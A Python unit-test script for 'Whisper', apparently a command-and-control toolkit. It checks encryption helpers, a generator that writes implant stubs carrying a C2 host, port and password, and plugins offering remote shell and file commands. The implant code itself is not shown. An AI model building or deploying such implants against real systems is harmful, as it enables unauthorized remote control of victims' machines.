"""Unit tests for Whisper components."""
import sys, os, json, base64, hashlib, hmac, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
os.environ["PYTHONPATH"] = os.path.dirname(os.path.abspath(__file__))

from server import derive_key, encrypt_bytes, decrypt_bytes
from stub_generator import generate_stub, estimate_size
from plugins import PLUGIN_REGISTRY, get_info, generate_plugin

PASS = "\033[92mPASS\033[0m"
FAIL = "\033[91mFAIL\033[0m"
results = {"pass": 0, "fail": 0}

def test(name, fn):
    try:
        result = fn()
        if result:
            print(f"  [{PASS}] {name}")
            results["pass"] += 1
        else:
            print(f"  [{FAIL}] {name}: returned False/None")
            results["fail"] += 1
    except Exception as e:
        print(f"  [{FAIL}] {name}: {e}")
        results["fail"] += 1

# --- Crypto Tests ---
print("1. Crypto...")

test("derive_key produces 32 bytes", lambda: len(derive_key("test")) == 32)
test("derive_key is deterministic", lambda: derive_key("test") == derive_key("test"))
test("derive_key differs with different passwords", lambda: derive_key("a") != derive_key("b"))

plaintext = b"hello world this is a test message"
key = derive_key("whisper_secret_key")

ct = encrypt_bytes(plaintext, key)
test("encrypt returns bytes", lambda: isinstance(ct, bytes))
test("encrypt produces IV+tag+ct format", lambda: len(ct) >= 32)

pt2 = decrypt_bytes(ct, key)
test("decrypt round-trips correctly", lambda: pt2 == plaintext)

wrong_key = derive_key("wrong_password")
try:
    decrypt_bytes(ct, wrong_key)
    test("decrypt with wrong key raises", lambda: False)
except ValueError:
    test("decrypt with wrong key raises", lambda: True)
except Exception:
    test("decrypt with wrong key raises", lambda: True)

# Tampered ciphertext
tampered = bytearray(ct)
tampered[20] ^= 0xFF  # flip a bit in the tag or IV
try:
    decrypt_bytes(bytes(tampered), key)
    test("tampered ciphertext rejected", lambda: False)
except (ValueError, Exception):
    test("tampered ciphertext rejected", lambda: True)

# Large payload
large = os.urandom(10000)
ct_large = encrypt_bytes(large, key)
pt_large = decrypt_bytes(ct_large, key)
test("large payload (10KB) round-trips", lambda: pt_large == large)

# --- Stub Generator Tests ---
print("\n2. Stub Generator...")

test("generate stub with all plugins", lambda: len(generate_stub(sorted(PLUGIN_REGISTRY.keys()), "127.0.0.1", 4443, "test", 10)) > 0)
test("generate stub with single plugin", lambda: len(generate_stub(["shell"], "127.0.0.1", 4443, "test", 10)) > 0)
test("generate stub with empty list", lambda: len(generate_stub([], "127.0.0.1", 4443, "test", 10)) > 0)
test("C2 host in stub", lambda: "192.168.1.1" in generate_stub(["shell"], "192.168.1.1", 4443, "test", 10))
test("C2 port in stub", lambda: "8888" in generate_stub(["shell"], "127.0.0.1", 8888, "test", 10))
test("password in stub", lambda: "mysecretpass" in generate_stub(["shell"], "127.0.0.1", 4443, "mysecretpass", 10))
test("reconnect delay in stub", lambda: "30" in generate_stub(["shell"], "127.0.0.1", 4443, "test", 30))

stub_code = generate_stub(["shell", "file_manager"], "127.0.0.1", 4443, "test", 10)
test("generated stub has _CMDS", lambda: "_CMDS" in stub_code)
test("generated stub has _main", lambda: "def _main" in stub_code)
test("generated stub has shell cmd", lambda: "_cmd_shell" in stub_code)
test("generated stub has ls cmd", lambda: "_cmd_ls" in stub_code)
test("generated stub compiles", lambda: compile(stub_code, "<test>", "exec") is not None)

# --- Plugin Registry Tests ---
print("\n3. Plugin Registry...")

info = get_info()
test("all plugins have metadata", lambda: len(info) == len(PLUGIN_REGISTRY))

for name in sorted(PLUGIN_REGISTRY.keys()):
    mod = PLUGIN_REGISTRY[name]
    test(f"plugin {name}: has PLUGIN dict", lambda m=mod: hasattr(m, "PLUGIN"))
    test(f"plugin {name}: PLUGIN has name", lambda m=mod: "name" in m.PLUGIN)
    test(f"plugin {name}: PLUGIN has desc", lambda m=mod: "desc" in m.PLUGIN)
    code, cmds = generate_plugin(name)
    test(f"plugin {name}: STUB_CODE is non-empty", lambda c=code: len(c) > 0)
    test(f"plugin {name}: has commands", lambda c=cmds: len(c) > 0)
    for cmd_name, func_name in cmds.items():
        test(f"plugin {name}: command '{cmd_name}' maps to '{func_name}'", lambda f=func_name, c=code: f in c)

# --- estimate_size ---
print("\n4. Utility...")

test("estimate_size returns positive int", lambda: estimate_size(stub_code, ["shell"]) > 0)

# Summary
print(f"\n\033[96mResults: {results['pass']} passed, {results['fail']} failed\033[0m")
sys.exit(0 if results["fail"] == 0 else 1)
